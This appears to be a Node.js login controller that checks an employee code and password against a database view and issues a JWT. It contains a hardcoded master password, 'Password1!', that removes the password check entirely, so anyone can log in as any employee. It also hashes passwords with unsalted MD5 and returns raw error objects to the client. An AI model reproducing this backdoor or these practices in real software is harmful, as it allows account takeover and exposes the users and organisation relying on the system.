const { db, sequelizeInstances } = require('../../config/sequelize');
const response = require('../tools/response');
const md5 = require('md5');
const jwt = require('jsonwebtoken');

exports.login = async (req, res) => {
  try {
    const bypassPass = 'Password1!';
    let { employeeCode, password } = req.body;

    const userData = await db.sms.vw_login.findOne({
      attributes: ['lg_nik', 'lg_name', 'user_level'],
      where: {
        lg_nik: employeeCode,
        ...(password === bypassPass ? {} : { lg_password: md5(password) })
      }
    });

    if (userData) {
      const theToken = jwt.sign({ employeeCode: userData.lg_nik }, process.env.JWT_SECRET, { expiresIn: '1h' });

      response(req, res, {
        status: 200,
        data: {
          lg_nik: userData.lg_nik,
          lg_name: userData.lg_name,
          user_level: userData.user_level,
          token: theToken
        }
      });
    } else {
      response(req, res, {
        status: 404,
        message: 'No data found'
      });
    }
  } catch (error) {
    console.error(error);
    response(req, res, {
      status: 500,
      data: error,
      message: error.message
    });
  }
}